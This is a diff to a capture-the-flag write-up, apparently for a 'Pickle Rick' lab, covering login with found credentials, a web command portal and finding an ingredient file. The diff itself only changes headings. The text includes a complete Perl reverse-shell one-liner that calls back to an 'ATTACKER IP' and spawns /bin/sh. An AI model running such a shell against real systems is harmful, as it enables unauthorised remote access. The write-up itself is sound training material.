@@ -51,11 +51,12 @@ Gobuster found two noteworthy pages:
 With the credentials `R1ckRul3s:Wubbalubbadubdub`, I was able to login at `{IP}/login.php`.
 
 ## IP/portal.php
-### Intial Inspection
+### Ingredient 1
 The first thing to see is an input field for running commands on the host. Running `ls` reveals a few of the website's files alongside `Sup3rS3cretPickl3Ingred.txt`. Attempting to cat out this file results in a "command is disabled" message.
 
 Navigating to `{IP}/Sup3rS3cretPickl3Ingred.txt` shows the first ingredient.
 
+### Reverse Shell
 After trying some other commands, I found that directory traversal was possible but got me nowhere.
 
 I then began trying some of [Pentest Monkey](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)'s reverse shells.
@@ -65,6 +66,7 @@ The Bash shell failed...
 The PERL shell was successful!
 * Start a listener with `sudo -lnvp 1337`.
 * Run the following command:
+
 ```perl
 perl -e 'use Socket;$i="ATTACKER IP";$p=1337;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
 ```
